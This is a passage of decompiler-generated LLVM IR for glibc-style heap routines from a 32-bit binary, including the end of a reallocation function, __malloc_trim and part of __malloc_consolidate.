  %v2_8053c16 = inttoptr i32 %v1_8053c16 to i32*
  %v3_8053c16 = load i32, i32* %v2_8053c16, align 4
  store i32 %v3_8053c16, i32* %eax.global-to-local, align 4
  %v1_8053c19 = load i32, i32* @edx, align 4
  %v2_8053c19 = add i32 %v1_8053c19, 8
  %v3_8053c19 = inttoptr i32 %v2_8053c19 to i32*
  store i32 %v3_8053c16, i32* %v3_8053c19, align 4
  %tmp24 = icmp ult i32 %v1_8053be7, 17
  br i1 %tmp24, label %dec_label_pc_8053c4c, label %dec_label_pc_8053c1e

dec_label_pc_8053c1e:                             ; preds = %dec_label_pc_8053c05
  %v0_8053c1e = load i32, i32* @esi, align 4
  %v1_8053c1e = add i32 %v0_8053c1e, 12
  %v2_8053c1e = inttoptr i32 %v1_8053c1e to i32*
  %v3_8053c1e = load i32, i32* %v2_8053c1e, align 4
  store i32 %v3_8053c1e, i32* %eax.global-to-local, align 4
  %v0_8053c21 = load i32, i32* %ecx.global-to-local, align 4
  %v1_8053c24 = load i32, i32* @edx, align 4
  %v2_8053c24 = add i32 %v1_8053c24, 12
  %v3_8053c24 = inttoptr i32 %v2_8053c24 to i32*
  store i32 %v3_8053c1e, i32* %v3_8053c24, align 4
  %v0_8053c27 = load i32, i32* @esi, align 4
  %v1_8053c27 = add i32 %v0_8053c27, 16
  %v2_8053c27 = inttoptr i32 %v1_8053c27 to i32*
  %v3_8053c27 = load i32, i32* %v2_8053c27, align 4
  store i32 %v3_8053c27, i32* %eax.global-to-local, align 4
  %v1_8053c2a = load i32, i32* @edx, align 4
  %v2_8053c2a = add i32 %v1_8053c2a, 16
  %v3_8053c2a = inttoptr i32 %v2_8053c2a to i32*
  store i32 %v3_8053c27, i32* %v3_8053c2a, align 4
  %tmp25 = icmp ult i32 %v0_8053c21, 7
  br i1 %tmp25, label %dec_label_pc_8053c4c, label %dec_label_pc_8053c2f

dec_label_pc_8053c2f:                             ; preds = %dec_label_pc_8053c1e
  %v0_8053c2f = load i32, i32* @esi, align 4
  %v1_8053c2f = add i32 %v0_8053c2f, 20
  %v2_8053c2f = inttoptr i32 %v1_8053c2f to i32*
  %v3_8053c2f = load i32, i32* %v2_8053c2f, align 4
  store i32 %v3_8053c2f, i32* %eax.global-to-local, align 4
  %v0_8053c32 = load i32, i32* %ecx.global-to-local, align 4
  %v1_8053c35 = load i32, i32* @edx, align 4
  %v2_8053c35 = add i32 %v1_8053c35, 20
  %v3_8053c35 = inttoptr i32 %v2_8053c35 to i32*
  store i32 %v3_8053c2f, i32* %v3_8053c35, align 4
  %v0_8053c38 = load i32, i32* @esi, align 4
  %v1_8053c38 = add i32 %v0_8053c38, 24
  %v2_8053c38 = inttoptr i32 %v1_8053c38 to i32*
  %v3_8053c38 = load i32, i32* %v2_8053c38, align 4
  store i32 %v3_8053c38, i32* %eax.global-to-local, align 4
  %v1_8053c3b = load i32, i32* @edx, align 4
  %v2_8053c3b = add i32 %v1_8053c3b, 24
  %v3_8053c3b = inttoptr i32 %v2_8053c3b to i32*
  store i32 %v3_8053c38, i32* %v3_8053c3b, align 4
  %tmp26 = icmp ult i32 %v0_8053c32, 9
  br i1 %tmp26, label %dec_label_pc_8053c4c, label %dec_label_pc_8053c40

dec_label_pc_8053c40:                             ; preds = %dec_label_pc_8053c2f
  %v0_8053c40 = load i32, i32* @esi, align 4
  %v1_8053c40 = add i32 %v0_8053c40, 28
  %v2_8053c40 = inttoptr i32 %v1_8053c40 to i32*
  %v3_8053c40 = load i32, i32* %v2_8053c40, align 4
  store i32 %v3_8053c40, i32* %eax.global-to-local, align 4
  %v1_8053c43 = load i32, i32* @edx, align 4
  %v2_8053c43 = add i32 %v1_8053c43, 28
  %v3_8053c43 = inttoptr i32 %v2_8053c43 to i32*
  store i32 %v3_8053c40, i32* %v3_8053c43, align 4
  %v0_8053c46 = load i32, i32* @esi, align 4
  %v1_8053c46 = add i32 %v0_8053c46, 32
  %v2_8053c46 = inttoptr i32 %v1_8053c46 to i32*
  %v3_8053c46 = load i32, i32* %v2_8053c46, align 4
  store i32 %v3_8053c46, i32* %eax.global-to-local, align 4
  %v1_8053c49 = load i32, i32* @edx, align 4
  %v2_8053c49 = add i32 %v1_8053c49, 32
  %v3_8053c49 = inttoptr i32 %v2_8053c49 to i32*
  store i32 %v3_8053c46, i32* %v3_8053c49, align 4
  br label %dec_label_pc_8053c4c

dec_label_pc_8053c4c:                             ; preds = %dec_label_pc_8053c2f, %dec_label_pc_8053c1e, %dec_label_pc_8053c05, %dec_label_pc_8053bf4, %dec_label_pc_8053c40
  %v0_8053c4f = load i32, i32* %ebx.global-to-local, align 4
  %v1_8053c4f = add i32 %v0_8053c4f, 8
  store i32 %v1_8053c4f, i32* @ebx, align 4
  store i32 %tmp8, i32* %stack_var_-60, align 4
  %v1_8053c56 = call i32 @free(i32 %tmp8)
  br label %dec_label_pc_8053d8a

dec_label_pc_8053c60:                             ; preds = %dec_label_pc_8053b21, %dec_label_pc_8053bd7, %dec_label_pc_8053ba5
  %v1_8053c71 = phi i32 [ %v1_8053b11, %dec_label_pc_8053b21 ], [ %v2_8053bde, %dec_label_pc_8053bd7 ], [ %v0_8053c60.pre, %dec_label_pc_8053ba5 ]
  %v5_8053c62 = sub i32 %v1_8053c71, %stack_var_-40.0
  store i32 %v5_8053c62, i32* %ecx.global-to-local, align 4
  %tmp27 = icmp ult i32 %v5_8053c62, 16
  br i1 %tmp27, label %dec_label_pc_8053c6b, label %dec_label_pc_8053c7d

dec_label_pc_8053c6b:                             ; preds = %dec_label_pc_8053c60
  %v0_8053c6b = load i32, i32* @edi, align 4
  %v1_8053c6b = add i32 %v0_8053c6b, 4
  %v2_8053c6b = inttoptr i32 %v1_8053c6b to i32*
  %v3_8053c6b = load i32, i32* %v2_8053c6b, align 4
  %v1_8053c6e = urem i32 %v3_8053c6b, 2
  %v2_8053c71 = or i32 %v1_8053c6e, %v1_8053c71
  store i32 %v2_8053c71, i32* %eax.global-to-local, align 4
  store i32 %v2_8053c71, i32* %v2_8053c6b, align 4
  %v0_8053c76 = load i32, i32* @edi, align 4
  %v1_8053c76 = load i32, i32* @ebx, align 4
  %v2_8053c76 = add i32 %v0_8053c76, 4
  %v3_8053c76 = add i32 %v2_8053c76, %v1_8053c76
  %v4_8053c76 = inttoptr i32 %v3_8053c76 to i32*
  %v5_8053c76 = load i32, i32* %v4_8053c76, align 4
  %v6_8053c76 = or i32 %v5_8053c76, 1
  store i32 %v6_8053c76, i32* %v4_8053c76, align 4
  br label %dec_label_pc_8053cad

dec_label_pc_8053c7d:                             ; preds = %dec_label_pc_8053c60
  %v0_8053c81 = load i32, i32* @edi, align 4
  %v2_8053c81 = add i32 %v0_8053c81, %stack_var_-40.0
  store i32 %v2_8053c81, i32* %eax.global-to-local, align 4
  %v1_8053c84 = add i32 %v0_8053c81, 4
  %v2_8053c84 = inttoptr i32 %v1_8053c84 to i32*
  %v3_8053c84 = load i32, i32* %v2_8053c84, align 4
  %v1_8053c87 = urem i32 %v3_8053c84, 2
  %v5_8053c8a = or i32 %v1_8053c87, %stack_var_-40.0
  store i32 %v5_8053c8a, i32* %v2_8053c84, align 4
  %v0_8053c94 = load i32, i32* %ecx.global-to-local, align 4
  %v1_8053c96 = or i32 %v0_8053c94, 1
  store i32 %v1_8053c96, i32* @edx, align 4
  %v1_8053c99 = load i32, i32* %eax.global-to-local, align 4
  %v2_8053c99 = add i32 %v1_8053c99, 4
  %v3_8053c99 = inttoptr i32 %v2_8053c99 to i32*
  store i32 %v1_8053c96, i32* %v3_8053c99, align 4
  %v0_8053c9c = load i32, i32* %eax.global-to-local, align 4
  %v1_8053c9c = load i32, i32* %ecx.global-to-local, align 4
  %v2_8053c9c = add i32 %v0_8053c9c, 4
  %v3_8053c9c = add i32 %v2_8053c9c, %v1_8053c9c
  %v4_8053c9c = inttoptr i32 %v3_8053c9c to i32*
  %v5_8053c9c = load i32, i32* %v4_8053c9c, align 4
  %v6_8053c9c = or i32 %v5_8053c9c, 1
  store i32 %v6_8053c9c, i32* %v4_8053c9c, align 4
  %v0_8053ca1 = load i32, i32* %eax.global-to-local, align 4
  %v1_8053ca1 = add i32 %v0_8053ca1, 8
  store i32 %v1_8053ca1, i32* %eax.global-to-local, align 4
  store i32 %v1_8053ca1, i32* %stack_var_-60, align 4
  %v1_8053ca5 = call i32 @free(i32 %v1_8053ca1)
  store i32 %v1_8053ca5, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8053cad

dec_label_pc_8053cad:                             ; preds = %dec_label_pc_8053c6b, %dec_label_pc_8053c7d
  %v0_8053cad = load i32, i32* @edi, align 4
  %v1_8053cad = add i32 %v0_8053cad, 8
  store i32 %v1_8053cad, i32* @ebx, align 4
  br label %dec_label_pc_8053d97

dec_label_pc_8053cb5:                             ; preds = %dec_label_pc_8053b05
  store i32 %tmp8, i32* %ecx.global-to-local, align 4
  %v0_8053cb9 = load i32, i32* @global_var_8061bbc.500, align 4
  store i32 %v0_8053cb9, i32* %eax.global-to-local, align 4
  %v2_8053cc2 = inttoptr i32 %v1_8053b09 to i32*
  %v3_8053cc2 = load i32, i32* %v2_8053cc2, align 4
  store i32 %v3_8053cc2, i32* @ebp, align 4
  %v1_8053cc5 = add i32 %v0_8053cb9, -1
  %v1_8053cc6 = or i32 %stack_var_-40.0, 4
  store i32 %v1_8053cc6, i32* %stack_var_-44, align 4
  %v2_8053ccc = add i32 %v1_8053cc5, %v3_8053cc2
  store i32 %v2_8053ccc, i32* @edx, align 4
  %v1_8053ccf = sub i32 0, %v0_8053cb9
  store i32 %v1_8053ccf, i32* %eax.global-to-local, align 4
  %v2_8053cd1 = add i32 %v2_8053ccc, %v1_8053cc6
  %v2_8053cd4 = and i32 %v2_8053cd1, %v1_8053ccf
  store i32 %v2_8053cd4, i32* @esi, align 4
  %v2_8053cd8 = sub i32 %v2_8053cd4, %v3_8053cc2
  store i32 %v2_8053cd8, i32* @ebx, align 4
  %v15_8053cda = icmp eq i32 %v1_8053b11, %v2_8053cd8
  br i1 %v15_8053cda, label %dec_label_pc_8053d93, label %dec_label_pc_8053ce4

dec_label_pc_8053ce4:                             ; preds = %dec_label_pc_8053cb5
  %v2_8053ce6 = sub i32 %v1_8053b09, %v3_8053cc2
  store i32 %v2_8053ce6, i32* @edi, align 4
  %v2_8053ced = add i32 %v3_8053cc2, %v1_8053b11
  store i32 %v2_8053ced, i32* %eax.global-to-local, align 4
  store i32 %v2_8053ce6, i32* %stack_var_-60, align 4
  %v6_8053cf1 = call i32 @mremap(i32 %v2_8053ce6, i32 %v2_8053ced, i32 %v2_8053cd4, i32 1, i32 %v1_8053cc6, i32 %v1_8053b11)
  store i32 %v6_8053cf1, i32* %eax.global-to-local, align 4
  %v10_8053cf9 = icmp eq i32 %v6_8053cf1, -1
  br i1 %v10_8053cf9, label %dec_label_pc_8053d4b, label %dec_label_pc_8053cfe

dec_label_pc_8053cfe:                             ; preds = %dec_label_pc_8053ce4
  %v1_8053cfe = load i32, i32* @ebp, align 4
  %v2_8053cfe = add i32 %v1_8053cfe, %v6_8053cf1
  store i32 %v2_8053cfe, i32* %eax.global-to-local, align 4
  %v0_8053d00 = load i32, i32* @ebx, align 4
  %v1_8053d00 = or i32 %v0_8053d00, 2
  %v2_8053d03 = add i32 %v2_8053cfe, 4
  %v3_8053d03 = inttoptr i32 %v2_8053d03 to i32*
  store i32 %v1_8053d00, i32* %v3_8053d03, align 4
  %v0_8053d06 = load i32, i32* @esi, align 4
  %v5_8053d08 = sub i32 %v0_8053d06, %v1_8053b11
  %v0_8053d0c = load i32, i32* @global_var_8061bd0.504, align 16
  %v0_8053d12 = load i32, i32* %eax.global-to-local, align 4
  %v1_8053d12 = add i32 %v0_8053d12, 8
  store i32 %v1_8053d12, i32* @ebx, align 4
  %v1_8053d15 = load i32, i32* @global_var_8061bc4.506, align 4
  %v2_8053d15 = add i32 %v1_8053d15, %v5_8053d08
  store i32 %v2_8053d15, i32* @global_var_8061bc4.506, align 4
  %tmp20 = icmp ule i32 %v2_8053d15, %v0_8053d0c
  %v5_8053d27 = select i1 %tmp20, i32 %v0_8053d0c, i32 %v2_8053d15
  store i32 %v5_8053d27, i32* %ecx.global-to-local, align 4
  %v1_8053d2a = load i32, i32* @global_var_8061bc8.507, align 8
  %v2_8053d2a = add i32 %v1_8053d2a, %v2_8053d15
  store i32 %v5_8053d27, i32* @global_var_8061bd0.504, align 16
  %v1_8053d36 = load i32, i32* @global_var_8061bd4.508, align 4
  %tmp28 = icmp ule i32 %v2_8053d2a, %v1_8053d36
  %v5_8053d3c = select i1 %tmp28, i32 %v1_8053d36, i32 %v2_8053d2a
  store i32 %v5_8053d3c, i32* @edx, align 4
  store i32 %v5_8053d3c, i32* @global_var_8061bd4.508, align 4
  br label %dec_label_pc_8053d97

dec_label_pc_8053d4b:                             ; preds = %dec_label_pc_8053ce4
  %v2_8053d4b = load i32, i32* %stack_var_-44, align 4
  store i32 %v2_8053d4b, i32* %eax.global-to-local, align 4
  %v10_8053d4e = icmp ult i32 %v1_8053b11, %v2_8053d4b
  %v1_8053d52 = icmp eq i1 %v10_8053d4e, false
  br i1 %v1_8053d52, label %dec_label_pc_8053d93, label %dec_label_pc_8053d54

dec_label_pc_8053d54:                             ; preds = %dec_label_pc_8053d4b
  %v1_8053d5b = add i32 %stack_var_-40.0, -7
  store i32 %v1_8053d5b, i32* %eax.global-to-local, align 4
  store i32 %v1_8053d5b, i32* %stack_var_-60, align 4
  %v1_8053d5f = call i32 @malloc(i32 %v1_8053d5b)
  store i32 %v1_8053d5f, i32* %eax.global-to-local, align 4
  %v1_8053d67 = icmp eq i32 %v1_8053d5f, 0
  store i32 %v1_8053d5f, i32* @ebx, align 4
  br i1 %v1_8053d67, label %dec_label_pc_8053d8f, label %dec_label_pc_8053d6d

dec_label_pc_8053d6d:                             ; preds = %dec_label_pc_8053d54
  %v1_8053d72 = add i32 %v1_8053b11, -8
  store i32 %v1_8053d72, i32* %eax.global-to-local, align 4
  store i32 %v1_8053d5f, i32* %stack_var_-60, align 4
  %v3_8053d7b = inttoptr i32 %v1_8053d5f to i16*
  %v4_8053d7b = call i32 @memcpy(i16* %v3_8053d7b, i32 %tmp8, i32 %v1_8053d72)
  store i32 %v4_8053d7b, i32* %eax.global-to-local, align 4
  store i32 %v1_8053d5f, i32* @edx, align 4
  store i32 %tmp8, i32* %stack_var_-60, align 4
  %v1_8053d85 = call i32 @free(i32 %tmp8)
  br label %dec_label_pc_8053d8a

dec_label_pc_8053d8a:                             ; preds = %dec_label_pc_8053c4c, %dec_label_pc_8053d6d
  %storemerge = phi i32 [ %v1_8053d85, %dec_label_pc_8053d6d ], [ %v1_8053c56, %dec_label_pc_8053c4c ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8053d97

dec_label_pc_8053d8f:                             ; preds = %dec_label_pc_8053d54, %dec_label_pc_8053bb0
  store i32 0, i32* @ebx, align 4
  br label %dec_label_pc_8053d97

dec_label_pc_8053d93:                             ; preds = %dec_label_pc_8053d4b, %dec_label_pc_8053cb5, %dec_label_pc_8053b4f
  store i32 %tmp8, i32* @ebx, align 4
  br label %dec_label_pc_8053d97

dec_label_pc_8053d97:                             ; preds = %dec_label_pc_8053d8f, %dec_label_pc_8053d8a, %dec_label_pc_8053cfe, %dec_label_pc_8053cad, %dec_label_pc_8053d93
  store i32 %v2_8053abe, i32* @eax, align 4
  store i32 %v2_8053abe, i32* %stack_var_-60, align 4
  %v2_8053da0 = call i32 @__pthread_return_void(i32 %v2_8053abe, i32 1)
  store i32 %v2_8053da0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8053da5

dec_label_pc_8053da5:                             ; preds = %dec_label_pc_8053aa2, %dec_label_pc_8053a8e, %dec_label_pc_8053d97
  br label %dec_label_pc_8053da8

dec_label_pc_8053da8:                             ; preds = %dec_label_pc_8053adc, %dec_label_pc_8053da5
  %v0_8053dab = load i32, i32* @ebx, align 4
  store i32 %v0_8053dab, i32* %eax.global-to-local, align 4
  store i32 %v0_8053a7f, i32* %ebx.global-to-local, align 4
  store i32 %v0_8053a7e, i32* @esi, align 4
  ret i32 %v0_8053dab

; uselistorder directives
  uselistorder i32 %v1_8053d5f, { 0, 2, 1, 3, 4, 5 }
  uselistorder i32 %v1_8053d36, { 1, 0 }
  uselistorder i32 %v2_8053d2a, { 1, 0 }
  uselistorder i32 %v2_8053d15, { 0, 3, 1, 2 }
  uselistorder i32 %v0_8053d0c, { 1, 0 }
  uselistorder i32 %v6_8053cf1, { 1, 0, 2 }
  uselistorder i32 %v2_8053ce6, { 1, 0, 2 }
  uselistorder i32 %v1_8053cc6, { 2, 0, 1 }
  uselistorder i32 %v3_8053cc2, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v0_8053c81, { 1, 0 }
  uselistorder i32 %v1_8053be7, { 0, 3, 1, 2, 4 }
  uselistorder i32 %v1_8053bbb, { 1, 3, 2, 0, 4, 5, 6, 7 }
  uselistorder i32 %v2_8053b5f, { 1, 0, 2 }
  uselistorder i32 %v3_8053b72, { 0, 2, 1 }
  uselistorder i32 %v2_8053b2f, { 0, 1, 3, 4, 2, 5 }
  uselistorder i32 %v1_8053b11, { 12, 11, 13, 10, 1, 0, 7, 15, 2, 14, 3, 4, 5, 6, 9, 8, 16 }
  uselistorder i32 %v1_8053b09, { 1, 2, 0, 3 }
  uselistorder i32 %stack_var_-40.0, { 12, 4, 0, 1, 9, 8, 7, 2, 5, 3, 6, 11, 10 }
  uselistorder i32 %v1_8053afe, { 1, 0 }
  uselistorder i32 %v1_8053aee, { 1, 2, 0 }
  uselistorder i32 %v0_8053ad7, { 1, 0 }
  uselistorder i32 %v2_8053abe, { 1, 0, 2, 4, 3, 5 }
  uselistorder i32* %stack_var_-60, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 0, 10, 11, 12, 13 }
  uselistorder i32 %tmp8, { 13, 12, 11, 1, 10, 9, 8, 7, 2, 0, 6, 5, 4, 3 }
  uselistorder i32* %eax.global-to-local, { 1, 2, 48, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 37, 38, 36, 39, 40, 41, 42, 0, 43, 44, 45, 46, 47 }
  uselistorder i32 %arg2, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_8053da8, { 1, 0 }
  uselistorder label %dec_label_pc_8053da5, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8053d97, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_8053d8a, { 1, 0 }
  uselistorder label %dec_label_pc_8053cad, { 1, 0 }
  uselistorder label %dec_label_pc_8053c60, { 1, 2, 0 }
  uselistorder label %dec_label_pc_8053c4c, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_8053ba5, { 1, 0 }
  uselistorder label %dec_label_pc_8053b05, { 1, 0 }
}

define i32 @__malloc_trim() local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %v0_8053db5 = load i32, i32* @edx, align 4
  store i32 %v0_8053db5, i32* %ebp.global-to-local, align 4
  %v0_8053db8 = load i32, i32* @esi, align 4
  %v1_8053dbd = add i32 %v0_8053db5, 860
  %v2_8053dbd = inttoptr i32 %v1_8053dbd to i32*
  %v3_8053dbd = load i32, i32* %v2_8053dbd, align 4
  store i32 %v3_8053dbd, i32* @ecx, align 4
  %v1_8053dc3 = add i32 %v0_8053db5, 44
  %v2_8053dc3 = inttoptr i32 %v1_8053dc3 to i32*
  %v3_8053dc3 = load i32, i32* %v2_8053dc3, align 4
  %v1_8053dc6 = add i32 %v3_8053dc3, 4
  %v2_8053dc6 = inttoptr i32 %v1_8053dc6 to i32*
  %v3_8053dc6 = load i32, i32* %v2_8053dc6, align 4
  %v1_8053dc9 = and i32 %v3_8053dc6, -4
  store i32 %v1_8053dc9, i32* @esi, align 4
  %v1_8053dce = load i32, i32* @eax, align 4
  %v2_8053dce = add i32 %v3_8053dbd, -17
  %v2_8053dd0 = add i32 %v2_8053dce, %v1_8053dc9
  %v3_8053dd0 = sub i32 %v2_8053dd0, %v1_8053dce
  %div = udiv i32 %v3_8053dd0, %v3_8053dbd
  store i32 %div, i32* %eax.global-to-local, align 4
  %tmp10 = urem i32 %v3_8053dd0, %v3_8053dbd
  store i32 %tmp10, i32* @edx, align 4
  %v1_8053dd8 = add i32 %div, -1
  %v4_8053ddb = mul i32 %v1_8053dd8, %v3_8053dbd
  store i32 %v4_8053ddb, i32* @ebx, align 4
  %tmp11 = icmp slt i32 %v4_8053ddb, 1
  br i1 %tmp11, label %dec_label_pc_8053e37, label %dec_label_pc_8053de2

dec_label_pc_8053de2:                             ; preds = %entry
  %v1_8053de7 = call i32 @__GI_sbrk(i32 0)
  store i32 %v1_8053de7, i32* %edi.global-to-local, align 4
  %v0_8053df1 = load i32, i32* @esi, align 4
  store i32 %v0_8053df1, i32* %eax.global-to-local, align 4
  %v1_8053df3 = load i32, i32* %ebp.global-to-local, align 4
  %v2_8053df3 = add i32 %v1_8053df3, 44
  %v3_8053df3 = inttoptr i32 %v2_8053df3 to i32*
  %v4_8053df3 = load i32, i32* %v3_8053df3, align 4
  %v5_8053df3 = add i32 %v4_8053df3, %v0_8053df1
  store i32 %v5_8053df3, i32* %eax.global-to-local, align 4
  %v12_8053df6 = icmp eq i32 %v1_8053de7, %v5_8053df3
  %v1_8053df8 = icmp eq i1 %v12_8053df6, false
  br i1 %v1_8053df8, label %dec_label_pc_8053e37, label %dec_label_pc_8053dfa

dec_label_pc_8053dfa:                             ; preds = %dec_label_pc_8053de2
  %v1_8053dfd = sub i32 0, %v4_8053ddb
  store i32 %v1_8053dfd, i32* @ebx, align 4
  %v1_8053e00 = call i32 @__GI_sbrk(i32 %v1_8053dfd)
  store i32 %v1_8053e00, i32* %eax.global-to-local, align 4
  %v1_8053e0c = call i32 @__GI_sbrk(i32 0)
  store i32 %v1_8053e0c, i32* %eax.global-to-local, align 4
  %v10_8053e14 = icmp eq i32 %v1_8053e0c, -1
  br i1 %v10_8053e14, label %dec_label_pc_8053e37, label %dec_label_pc_8053e19

dec_label_pc_8053e19:                             ; preds = %dec_label_pc_8053dfa
  %v0_8053e19 = load i32, i32* %edi.global-to-local, align 4
  %v2_8053e1b = sub i32 %v0_8053e19, %v1_8053e0c
  %v12_8053e1b = icmp eq i32 %v2_8053e1b, 0
  store i32 %v2_8053e1b, i32* @ecx, align 4
  br i1 %v12_8053e1b, label %dec_label_pc_8053e37, label %dec_label_pc_8053e1f

dec_label_pc_8053e1f:                             ; preds = %dec_label_pc_8053e19
  %v0_8053e1f = load i32, i32* %ebp.global-to-local, align 4
  %v1_8053e1f = add i32 %v0_8053e1f, 44
  %v2_8053e1f = inttoptr i32 %v1_8053e1f to i32*
  %v3_8053e1f = load i32, i32* %v2_8053e1f, align 4
  store i32 %v3_8053e1f, i32* %eax.global-to-local, align 4
  %v0_8053e22 = load i32, i32* @esi, align 4
  %v2_8053e22 = sub i32 %v0_8053e22, %v2_8053e1b
  store i32 %v2_8053e22, i32* %esi.global-to-local, align 4
  %v1_8053e24 = add i32 %v0_8053e1f, 872
  %v2_8053e24 = inttoptr i32 %v1_8053e24 to i32*
  %v3_8053e24 = load i32, i32* %v2_8053e24, align 4
  %v5_8053e24 = sub i32 %v3_8053e24, %v2_8053e1b
  store i32 %v5_8053e24, i32* %v2_8053e24, align 4
  %v0_8053e2a = load i32, i32* %esi.global-to-local, align 4
  %v1_8053e2a = or i32 %v0_8053e2a, 1
  store i32 %v1_8053e2a, i32* %esi.global-to-local, align 4
  %v1_8053e2d = load i32, i32* %eax.global-to-local, align 4
  %v2_8053e2d = add i32 %v1_8053e2d, 4
  %v3_8053e2d = inttoptr i32 %v2_8053e2d to i32*
  store i32 %v1_8053e2a, i32* %v3_8053e2d, align 4
  br label %dec_label_pc_8053e39

dec_label_pc_8053e37:                             ; preds = %dec_label_pc_8053e19, %dec_label_pc_8053dfa, %dec_label_pc_8053de2, %entry
  br label %dec_label_pc_8053e39

dec_label_pc_8053e39:                             ; preds = %dec_label_pc_8053e1f, %dec_label_pc_8053e37
  %storemerge = phi i32 [ 1, %dec_label_pc_8053e1f ], [ 0, %dec_label_pc_8053e37 ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  store i32 %v0_8053db8, i32* %esi.global-to-local, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v1_8053e0c, { 1, 0, 2 }
  uselistorder i32 %v4_8053ddb, { 1, 2, 0 }
  uselistorder i32 %v3_8053dbd, { 0, 3, 2, 1, 4 }
  uselistorder i32 %v0_8053db5, { 1, 0, 2 }
  uselistorder i32 (i32)* @__GI_sbrk, { 6, 5, 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_8053e39, { 1, 0 }
}

define i32 @__malloc_consolidate(i32* %arg1) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp11 = ptrtoint i32* %arg1 to i32
  %v0_8053e42 = load i32, i32* @edi, align 4
  %v0_8053e43 = load i32, i32* @esi, align 4
  %v0_8053e44 = load i32, i32* @ebx, align 4
  store i32 %tmp11, i32* %edx.global-to-local, align 4
  %v2_8053e4c = load i32, i32* %arg1, align 4
  store i32 %v2_8053e4c, i32* %eax.global-to-local, align 4
  store i32 1, i32* %edx.global-to-local, align 4
  %v1_8053e53 = icmp eq i32 %v2_8053e4c, 0
  br i1 %v1_8053e53, label %dec_label_pc_8053f7c.preheader, label %dec_label_pc_8053e5b

dec_label_pc_8053f7c.preheader:                   ; preds = %entry
  %v3_8053f71 = add i32 %tmp11, 44
  br label %dec_label_pc_8053f6d

dec_label_pc_8053e5b:                             ; preds = %entry
  %v1_8053e5f = and i32 %v2_8053e4c, -3
  store i32 %v1_8053e5f, i32* %arg1, align 4
  %v1_8053e64 = add i32 %tmp11, 52
  store i32 %tmp11, i32* @edx, align 4
  %v1_8053e73 = add i32 %tmp11, 4
  store i32 %v1_8053e73, i32* %eax.global-to-local, align 4
  %v2_8053e7a = load i32, i32* %arg1, align 4
  %v2_8053e80 = udiv i32 %v2_8053e7a, 8
  %v2_8053e83 = mul nuw i32 %v2_8053e80, 4
  %v3_8053e83 = add i32 %tmp11, -4
  %v4_8053e83 = add i32 %v3_8053e83, %v2_8053e83
  store i32 %v4_8053e83, i32* %eax.global-to-local, align 4
  %v2_8053f4a = add i32 %tmp11, 44
  %v3_8053f4a = inttoptr i32 %v2_8053f4a to i32*
  %v1_8053f1d = add i32 %tmp11, 60
  %v2_8053f1d = inttoptr i32 %v1_8053f1d to i32*
  br label %dec_label_pc_8053e8b

dec_label_pc_8053e8b:                             ; preds = %dec_label_pc_8053f63, %dec_label_pc_8053e5b
  %v0_8053e99 = phi i32 [ %v1_8053e73, %dec_label_pc_8053e5b ], [ %v4_8053f63, %dec_label_pc_8053f63 ]
  store i32 %v0_8053e99, i32* %eax.global-to-local, align 4
  %v1_8053e8f = inttoptr i32 %v0_8053e99 to i32*
  %v2_8053e8f = load i32, i32* %v1_8053e8f, align 4
  store i32 %v2_8053e8f, i32* @ecx, align 4
  %v1_8053e91 = icmp eq i32 %v2_8053e8f, 0
  br i1 %v1_8053e91, label %dec_label_pc_8053f59, label %dec_label_pc_8053e99

dec_label_pc_8053e99:                             ; preds = %dec_label_pc_8053e8b
  store i32 0, i32* %v1_8053e8f, align 4
  %v0_8053e9f.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_8053e9f

dec_label_pc_8053e9f:                             ; preds = %dec_label_pc_8053f4d, %dec_label_pc_8053e99
  %v0_8053ebc = phi i32 [ %v3_8053e9f, %dec_label_pc_8053f4d ], [ %v0_8053e9f.pre, %dec_label_pc_8053e99 ]
  %v1_8053e9f = add i32 %v0_8053ebc, 8
  %v2_8053e9f = inttoptr i32 %v1_8053e9f to i32*
  %v3_8053e9f = load i32, i32* %v2_8053e9f, align 4
  store i32 %v3_8053e9f, i32* %edx.global-to-local, align 4
  %v1_8053ea6 = add i32 %v0_8053ebc, 4
  %v2_8053ea6 = inttoptr i32 %v1_8053ea6 to i32*
  %v3_8053ea6 = load i32, i32* %v2_8053ea6, align 4
  store i32 %v3_8053ea6, i32* %eax.global-to-local, align 4
  %v1_8053eab = and i32 %v3_8053ea6, -2
  store i32 %v1_8053eab, i32* @edi, align 4
  %v2_8053eae = urem i32 %v3_8053ea6, 2
  %v3_8053eae = icmp eq i32 %v2_8053eae, 0
  %v2_8053eb0 = add i32 %v1_8053eab, %v0_8053ebc
  store i32 %v2_8053eb0, i32* @ebx, align 4
  %v1_8053eb3 = add i32 %v2_8053eb0, 4
  %v2_8053eb3 = inttoptr i32 %v1_8053eb3 to i32*
  %v3_8053eb3 = load i32, i32* %v2_8053eb3, align 4
  store i32 %v3_8053eb3, i32* %edx.global-to-local, align 4
  %v1_8053eba = icmp eq i1 %v3_8053eae, false
  br i1 %v1_8053eba, label %dec_label_pc_8053edc, label %dec_label_pc_8053ebc

dec_label_pc_8053ebc:                             ; preds = %dec_label_pc_8053e9f
  %v1_8053ebc = inttoptr i32 %v0_8053ebc to i32*
  %v2_8053ebc = load i32, i32* %v1_8053ebc, align 4
  store i32 %v2_8053ebc, i32* %ebp.global-to-local, align 4
  %v2_8053ec0 = sub i32 %v0_8053ebc, %v2_8053ebc
  store i32 %v2_8053ec0, i32* %eax.global-to-local, align 4
